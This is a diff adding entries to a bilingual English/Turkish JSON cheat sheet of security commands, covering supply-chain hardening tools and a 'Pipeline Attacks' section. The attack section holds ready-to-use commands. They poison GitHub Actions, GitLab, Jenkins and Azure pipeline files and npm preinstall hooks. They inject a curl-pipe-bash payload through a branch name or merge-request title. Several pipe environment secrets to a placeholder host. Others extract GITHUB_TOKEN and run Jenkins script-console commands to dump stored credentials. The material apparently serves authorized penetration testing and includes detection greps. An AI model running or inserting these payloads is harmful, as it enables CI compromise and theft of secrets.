+            "desc_tr": "in-toto ile bir build adımının girdi ve çıktılarını kaydet",
+            "cmd": "in-toto-run --step-name build --key <KEY> --materials . --products <FILE> -- <BUILD_CMD>",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "in-toto Verify Supply Chain Layout",
+            "desc": "Verify the final product against a signed supply-chain layout",
+            "desc_tr": "Nihai ürünü imzalı tedarik zinciri layout'una karşı doğrula",
+            "cmd": "in-toto-verify --layout root.layout --layout-keys <PUBKEY>",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Generate Artifact SHA-256 Checksum",
+            "desc": "Compute a SHA-256 digest for a build artifact",
+            "desc_tr": "Bir build artifact'i için SHA-256 özeti hesapla",
+            "cmd": "sha256sum <FILE> > <FILE>.sha256",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Verify Artifact Checksum",
+            "desc": "Validate an artifact against its recorded checksum file",
+            "desc_tr": "Bir artifact'i kayıtlı checksum dosyasına karşı doğrula",
+            "cmd": "sha256sum -c <FILE>.sha256",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "GPG Detached Sign Artifact",
+            "desc": "Create a detached ASCII-armored GPG signature",
+            "desc_tr": "Ayrık (detached) ASCII-armored GPG imzası oluştur",
+            "cmd": "gpg --armor --detach-sign --output <FILE>.asc <FILE>",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "GPG Verify Detached Signature",
+            "desc": "Verify a detached GPG signature against the artifact",
+            "desc_tr": "Ayrık bir GPG imzasını artifact'e karşı doğrula",
+            "cmd": "gpg --verify <FILE>.asc <FILE>",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Get Image Digest by Tag (crane)",
+            "desc": "Resolve a tag to its immutable content digest",
+            "desc_tr": "Bir etiketi değişmez içerik digest'ine çözümle",
+            "cmd": "crane digest <REGISTRY>/<IMAGE>:<TAG>",
+            "tags": [
+              "tool",
+              "advanced"
+            ],
+            "note": "Pin deployments to the immutable @sha256:... digest, not a mutable tag, to defeat tag re-push attacks."
+          },
+          {
+            "title": "Inspect Image Manifest (crane)",
+            "desc": "View the raw manifest and layer digests of an image",
+            "desc_tr": "Bir imajın ham manifest ve katman digest'lerini incele",
+            "cmd": "crane manifest <REGISTRY>/<IMAGE>:<TAG>",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Docker Content Trust Push",
+            "desc": "Enforce Notary signing when pushing an image",
+            "desc_tr": "İmaj gönderirken Notary imzalamayı zorunlu kıl",
+            "cmd": "DOCKER_CONTENT_TRUST=1 docker push <REGISTRY>/<IMAGE>:<TAG>",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Reproducible Build Timestamp (SOURCE_DATE_EPOCH)",
+            "desc": "Pin build timestamps for byte-reproducible artifacts",
+            "desc_tr": "Bayt düzeyinde tekrarlanabilir artifactler için zaman damgasını sabitle",
+            "cmd": "SOURCE_DATE_EPOCH=$(git log -1 --pretty=%ct) <BUILD_CMD>",
+            "tags": [
+              "advanced"
+            ],
+            "note": "Reproducible builds let independent rebuilds confirm an artifact matches its source, detecting tampered build environments."
+          },
+          {
+            "title": "Build Reproducible OCI Image with ko",
+            "desc": "Build a deterministic Go container image without a Dockerfile",
+            "desc_tr": "Dockerfile olmadan deterministik bir Go konteyner imajı oluştur",
+            "cmd": "ko build --bare --sbom spdx ./cmd/<APP>",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Verify Image Admission with Policy (Kyverno)",
+            "desc": "Apply a cluster policy requiring signed images",
+            "desc_tr": "İmzalı imaj gerektiren bir küme politikası uygula",
+            "cmd": "kubectl apply -f verify-image-policy.yaml -n <NAMESPACE>",
+            "tags": [
+              "tool",
+              "advanced"
+            ],
+            "note": "Kyverno/Sigstore-policy-controller verify signatures at admission, blocking unsigned images from ever running."
+          },
+          {
+            "title": "Cosign Copy Signatures Between Registries",
+            "desc": "Copy an image with its signatures and attestations",
+            "desc_tr": "Bir imajı imzaları ve attestation'ları ile birlikte kopyala",
+            "cmd": "cosign copy <SRC_REGISTRY>/<IMAGE>:<TAG> <DST_REGISTRY>/<IMAGE>:<TAG>",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Query Rekor Transparency Log",
+            "desc": "Look up a signing entry in the Rekor transparency log",
+            "desc_tr": "Rekor şeffaflık günlüğünde bir imzalama kaydını ara",
+            "cmd": "rekor-cli search --artifact <FILE>",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Filesystem/Repo Secret & Misconfig Scan (Trivy)",
+            "desc": "Scan source tree for secrets and misconfigs pre-build",
+            "desc_tr": "Build öncesi kaynak ağacını sır ve yanlış yapılandırma için tara",
+            "cmd": "trivy fs --scanners vuln,secret,misconfig --exit-code 1 <PATH>",
+            "tags": [
+              "tool",
+              "essential"
+            ]
+          }
+        ]
+      },
+      {
+        "name": "Pipeline Attacks (poisoned pipeline, PPE, injection)",
+        "commands": [
+          {
+            "title": "Find Self-Hosted Runner Workflows",
+            "desc": "Locate workflows using self-hosted runners (non-ephemeral RCE target)",
+            "desc_tr": "Self-hosted runner kullanan workflow'ları bul (kalıcı runner = RCE hedefi)",
+            "cmd": "grep -rEn 'runs-on:\\s*(self-hosted|\\[.*self-hosted.*\\])' .github/workflows/",
+            "tags": [
+              "essential"
+            ],
+            "note": "Non-ephemeral self-hosted runners on public repos let any fork PR run code on your infrastructure."
+          },
+          {
+            "title": "Detect pull_request_target Misuse",
+            "desc": "Find pull_request_target workflows that checkout untrusted PR code (PPE)",
+            "desc_tr": "Güvenilmeyen PR kodunu checkout eden pull_request_target workflow'larını bul (PPE)",
+            "cmd": "grep -rEn 'pull_request_target' .github/workflows/ | grep -i 'checkout'",
+            "tags": [
+              "essential"
+            ],
+            "note": "pull_request_target runs with write token + secrets; checking out PR head is the classic poisoned pipeline vector."
+          },
+          {
+            "title": "Grep for GitHub Actions Script Injection Sinks",
+            "desc": "Find attacker-controlled context interpolated into run: steps (injection)",
+            "desc_tr": "run: adımlarına enjekte edilen saldırgan kontrollü context'leri bul (injection)",
+            "cmd": "grep -rEn '\\$\\{\\{\\s*github\\.(event\\.(issue\\.title|issue\\.body|pull_request\\.title|pull_request\\.body|comment\\.body|review\\.body)|head_ref)' .github/workflows/",
+            "tags": [
+              "essential"
+            ],
+            "note": "github.event.*.title/body and head_ref are user-controlled; in run: blocks they enable shell injection."
+          },
+          {
+            "title": "PPE Injection via Branch Name (head_ref)",
+            "desc": "Craft a malicious branch name to inject into ${{ github.head_ref }} sinks",
+            "desc_tr": "${{ github.head_ref }} sink'lerine enjekte etmek için kötü amaçlı branch adı oluştur",
+            "cmd": "git checkout -b '$(curl -s http://<TARGET_IP>/x|bash)' && git push origin HEAD",
+            "tags": [
+              "advanced"
+            ],
+            "note": "Authorized testing only. Branch names flow into run: steps unescaped on vulnerable workflows."
+          },
+          {
+            "title": "Direct PPE — Modify CI Config in PR",
+            "desc": "Direct Poisoned Pipeline Execution by editing the pipeline definition itself",
+            "desc_tr": "Pipeline tanımını doğrudan düzenleyerek Direct PPE (Poisoned Pipeline Execution)",
+            "cmds": [
+              "git checkout -b ppe-test",
+              "printf 'jobs:\\n  x:\\n    runs-on: ubuntu-latest\\n    steps:\\n      - run: env | base64 | curl -d @- http://<TARGET_IP>\\n' >> .github/workflows/poc.yml",
+              "git add .github/workflows/poc.yml && git commit -m 'ci' && git push origin ppe-test"
+            ],
+            "tags": [
+              "advanced"
+            ],
+            "note": "Works when CI triggers on PRs and runs the PR's own pipeline file. Authorized engagements only."
+          },
+          {
+            "title": "Indirect PPE — Poison Build Scripts",
+            "desc": "Indirect PPE by poisoning files the pipeline executes (not the CI config)",
+            "desc_tr": "Pipeline'ın çalıştırdığı dosyaları (CI config değil) zehirleyerek Indirect PPE",
+            "cmds": [
+              "echo 'curl -s http://<TARGET_IP>/x | bash' >> Makefile",
+              "# or modify a referenced script the pipeline executes:",
+              "echo 'env | curl -X POST -d @- http://<TARGET_IP>' >> scripts/build.sh"
+            ],
+            "tags": [
+              "advanced"
+            ],
+            "note": "Targets Makefile, package.json scripts, build.sh, tox.ini, etc. that the pipeline runs."
+          },
+          {
+            "title": "Indirect PPE via package.json Lifecycle Scripts",
+            "desc": "Inject npm lifecycle hook that runs during pipeline dependency install",
+            "desc_tr": "Pipeline bağımlılık kurulumu sırasında çalışan npm lifecycle hook'u enjekte et",
+            "cmd": "npm pkg set scripts.preinstall='node -e \"require(\\'child_process\\').exec(\\'env|curl -d @- http://<TARGET_IP>\\')\"'",
+            "tags": [
+              "advanced"
+            ],
+            "note": "preinstall/postinstall fire on npm install in CI; common Indirect PPE path in JS projects."
+          },
+          {
+            "title": "Dump CI Secrets via Env Exfil",
+            "desc": "Exfiltrate pipeline environment secrets once code execution is achieved",
+            "desc_tr": "Kod çalıştırma sağlandıktan sonra pipeline ortam secret'larını dışarı sızdır",
+            "cmd": "env | grep -iE 'token|secret|key|password|aws|azure|gcp' | base64 -w0 | curl -s -d @- http://<TARGET_IP>/exfil",
+            "tags": [
+              "advanced"
+            ],
+            "note": "Masked secrets are still readable from env once code runs; masking is log-only."
+          },
+          {
+            "title": "Steal GITHUB_TOKEN from Runner",
+            "desc": "Recover the GITHUB_TOKEN persisted by actions/checkout in git config",
+            "desc_tr": "actions/checkout tarafından git config'e yazılan GITHUB_TOKEN'ı geri al",
+            "cmd": "git config --get http.https://github.com/.extraheader | sed 's/.*basic //' | base64 -d",
+            "tags": [
+              "advanced"
+            ],
+            "note": "actions/checkout stores the token as an http.extraheader unless persist-credentials:false is set."
+          },
+          {
+            "title": "Read Runner Temp/Event for Secrets",
+            "desc": "Harvest secrets from runner temp dirs and the event payload during PPE",
+            "desc_tr": "PPE sırasında runner temp dizinlerinden ve event payload'ından secret topla",
+            "cmd": "cat $GITHUB_EVENT_PATH; cat $RUNNER_TEMP/* 2>/dev/null; find / -name '*.runner' 2>/dev/null",
+            "tags": [
+              "advanced"
+            ],
+            "note": "GITHUB_EVENT_PATH JSON can contain tokens; RUNNER_TEMP often holds composite-action artifacts."
+          },
+          {
+            "title": "Scan Workflows with Actionlint",
+            "desc": "Static-check GitHub Actions workflows including expression-injection issues",
+            "desc_tr": "GitHub Actions workflow'larını ifade-enjeksiyonu dahil statik denetle",
+            "cmd": "actionlint -color .github/workflows/*.yml",
+            "tags": [
+              "tool"
+            ],
+            "note": "actionlint flags untrusted ${{ github.event... }} interpolation in run: steps."
+          },
+          {
+            "title": "Audit Pipelines with Poutine",
+            "desc": "Scan CI/CD configs for PPE, injection, and supply-chain misconfigs",
+            "desc_tr": "CI/CD config'lerini PPE, injection ve tedarik zinciri yanlış yapılandırmaları için tara",
+            "cmd": "poutine analyze_local <PATH> --format pretty",
+            "tags": [
+              "tool"
+            ],
+            "note": "Poutine (BoostSecurity) supports GitHub Actions, GitLab CI, Azure Pipelines, Pipelines-as-code."
+          },
+          {
+            "title": "Detect Mutable Action Tags (Pin Audit)",
+            "desc": "Find third-party actions pinned to mutable refs (poisoning risk)",
+            "desc_tr": "Değişebilir ref'lere sabitlenmiş üçüncü taraf action'ları bul (zehirlenme riski)",
+            "cmd": "grep -rEn 'uses:\\s*[^@]+@(v[0-9]+|main|master)$' .github/workflows/",
+            "tags": [
+              "essential"
+            ],
+            "note": "Pin actions to a full commit SHA; tags/branches can be repointed to malicious code."
+          },
+          {
+            "title": "Find Workflows Triggered by issue_comment",
+            "desc": "Identify dangerous triggers that run with elevated context on untrusted input",
+            "desc_tr": "Güvenilmeyen girdiyle yükseltilmiş context'te çalışan tehlikeli trigger'ları bul",
+            "cmd": "grep -rEn 'issue_comment|workflow_run|pull_request_review' .github/workflows/",
+            "tags": [
+              "advanced"
+            ],
+            "note": "issue_comment and workflow_run run on the base repo with secrets; common PPE pivots."
+          },
+          {
+            "title": "GitLab CI — Inject via .gitlab-ci.yml in MR",
+            "desc": "Direct PPE on GitLab by modifying the pipeline config in a merge request",
+            "desc_tr": "Merge request'te pipeline config'i değiştirerek GitLab'da Direct PPE",
+            "cmds": [
+              "git checkout -b ppe",
+              "printf 'poc:\\n  script:\\n    - env | curl -d @- http://<TARGET_IP>\\n' >> .gitlab-ci.yml",
+              "git commit -am 'ci' && git push origin ppe"
+            ],
+            "tags": [
+              "advanced"
+            ],
+            "note": "Mitigated by protected/CI restrictions; test only where merge_request pipelines run fork code."
+          },
+          {
+            "title": "GitLab Script Injection via MR Title",
+            "desc": "Inject shell via attacker-controlled CI_MERGE_REQUEST_TITLE variable",
+            "desc_tr": "Saldırgan kontrollü CI_MERGE_REQUEST_TITLE değişkeniyle shell enjekte et",
+            "cmd": "# Vulnerable job runs: echo \"$CI_MERGE_REQUEST_TITLE\" -> set MR title to: a\";curl http://<TARGET_IP>/x|bash;\"",
+            "tags": [
+              "advanced"
+            ],
+            "note": "CI_MERGE_REQUEST_TITLE/SOURCE_BRANCH_NAME are user-controlled predefined variables."
+          },
+          {
+            "title": "List GitLab Project CI/CD Variables",
+            "desc": "Enumerate CI/CD variables (secrets) reachable after pipeline compromise",
+            "desc_tr": "Pipeline ele geçirildikten sonra erişilebilen CI/CD değişkenlerini (secret) listele",
+            "cmd": "curl -s --header 'PRIVATE-TOKEN: <GITLAB_TOKEN>' 'https://<DOMAIN>/api/v4/projects/<PROJECT_ID>/variables'",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Jenkinsfile Poisoning in PR",
+            "desc": "Direct PPE on Jenkins multibranch pipelines by editing the Jenkinsfile",
+            "desc_tr": "Jenkinsfile'ı düzenleyerek Jenkins multibranch pipeline'larında Direct PPE",
+            "cmds": [
+              "git checkout -b ppe",
+              "printf 'pipeline { agent any; stages { stage(\\'x\\') { steps { sh \\'env | curl -d @- http://<TARGET_IP>\\' } } } }' > Jenkinsfile",
+              "git commit -am ci && git push origin ppe"
+            ],
+            "tags": [
+              "advanced"
+            ],
+            "note": "Multibranch + build-on-PR from forks executes the attacker Jenkinsfile with credentials."
+          },
+          {
+            "title": "Jenkins Groovy Script Console RCE",
+            "desc": "Run arbitrary Groovy/system commands on the Jenkins controller",
+            "desc_tr": "Jenkins controller üzerinde keyfi Groovy/sistem komutu çalıştır",
+            "cmd": "curl -s -X POST 'http://<TARGET_IP>:8080/scriptText' --user '<USER>:<PASS>' --data-urlencode 'script=println \"id\".execute().text'",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Dump All Jenkins Credentials via Groovy",
+            "desc": "Exfiltrate stored Jenkins credentials reachable from a poisoned pipeline",
+            "desc_tr": "Zehirlenmiş pipeline'dan erişilebilen Jenkins kimlik bilgilerini dışarı sızdır",
+            "cmd": "curl -s -X POST 'http://<TARGET_IP>:8080/scriptText' --user '<USER>:<PASS>' --data-urlencode 'script=com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(com.cloudbees.plugins.credentials.common.StandardCredentials, Jenkins.instance).each{println it}'",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Azure Pipelines — PPE via azure-pipelines.yml",
+            "desc": "Direct PPE on Azure DevOps by modifying the YAML pipeline in a PR",
+            "desc_tr": "PR'da YAML pipeline'ı değiştirerek Azure DevOps'ta Direct PPE",
+            "cmds": [
+              "git checkout -b ppe",
+              "printf 'trigger: none\\npr:\\n- main\\nsteps:\\n- script: env | curl -d @- http://<TARGET_IP>\\n' > azure-pipelines.yml",
+              "git commit -am ci && git push origin ppe"
+            ],
+            "tags": [
+              "advanced"
+            ],
+            "note": "Disable 'Build pull requests from forks' or require approval to mitigate."
+          },
+          {
+            "title": "Detect Insecure Self-Hosted Runner Persistence",
+            "desc": "Find runner work dirs/credentials enabling cross-job poisoning on shared runners",
+            "desc_tr": "Paylaşılan runner'larda işler arası zehirlenmeyi sağlayan runner çalışma dizini/kimlik bilgilerini bul",
+            "cmd": "find / -path '*/_work/*' -o -name '.credentials' 2>/dev/null | grep -i runner; ps aux | grep -i Runner.Listener",
+            "tags": [
+              "advanced"
+            ],
+            "note": "Non-ephemeral runners leak prior jobs' artifacts and .credentials; prefer ephemeral runners."
+          },
+          {
+            "title": "Hunt Hardcoded Secrets in Pipelines (gitleaks)",
+            "desc": "Scan repo and CI configs for committed secrets usable post-poisoning",
+            "desc_tr": "Repo ve CI config'lerini zehirleme sonrası kullanılabilir gömülü secret'lar için tara",
+            "cmd": "gitleaks detect --source <PATH> --redact -v",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Audit GitHub Org for Risky Workflows (gato)",
+            "desc": "Enumerate self-hosted runners and injectable workflows across an org",
+            "desc_tr": "Bir org genelinde self-hosted runner'ları ve enjekte edilebilir workflow'ları listele",
+            "cmd": "gato enumerate -t <ORG> --output-yaml /tmp/gato.yml",
+            "tags": [
+              "tool"
+            ],
+            "note": "gato (Praetorian) finds PPE/injection and pwn-request candidates needing a GitHub PAT."
+          },
+          {
+            "title": "Check for Unsafe Secrets in Reusable Workflows",
+            "desc": "Find reusable-workflow calls that pass all secrets downstream",
+            "desc_tr": "Tüm secret'ları aşağı akışa geçiren reusable-workflow çağrılarını bul",
+            "cmd": "grep -rEn 'secrets:\\s*inherit' .github/workflows/",
+            "tags": [
+              "essential"
+            ],
+            "note": "'secrets: inherit' widens blast radius if a called workflow is compromised."
+          },
+          {
+            "title": "Validate Workflow Token Permissions",
+            "desc": "List workflows lacking explicit least-privilege permissions block",
+            "desc_tr": "Açık en-az-yetki permissions bloğu olmayan workflow'ları listele",
+            "cmd": "grep -rL 'permissions:' .github/workflows/*.yml",
+            "tags": [
+              "essential"
+            ],
+            "note": "Without an explicit permissions: block the GITHUB_TOKEN may default to write, amplifying PPE impact."
+          },
+          {
+            "title": "Detect curl-pipe-shell Patterns in CI",
+            "desc": "Find pipe-to-shell installs that enable supply-chain/Indirect PPE",
+            "desc_tr": "Tedarik zinciri/Indirect PPE'ye olanak tanıyan boru-ile-shell kurulumlarını bul",
+            "cmd": "grep -rEn 'curl[^|]+\\|\\s*(sudo\\s+)?(ba)?sh' .github/ .gitlab-ci.yml Jenkinsfile 2>/dev/null",
+            "tags": [
+              "advanced"
+            ],
+            "note": "Unpinned remote scripts piped to shell are a common pipeline poisoning entrypoint."
+          }
+        ]
+      }
+    ]
   }
 ];
